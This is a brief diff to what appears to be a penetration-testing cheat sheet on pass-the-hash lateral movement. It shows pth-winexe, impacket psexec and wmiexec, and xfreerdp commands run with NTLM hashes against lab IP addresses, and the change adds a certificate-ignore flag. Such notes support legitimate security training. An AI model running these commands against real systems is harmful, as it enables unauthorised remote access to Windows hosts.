@@ -207,7 +207,7 @@ Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p P
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 /usr/share/doc/python3-impacket/examples/psexec.py OFFSEC.LOCAL/Administrator@192.168.176.57 -hashes "aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5"
 /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
-xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ipAddr>
+xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ipAddr> /cert-ignore
 ```
 
 ###### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
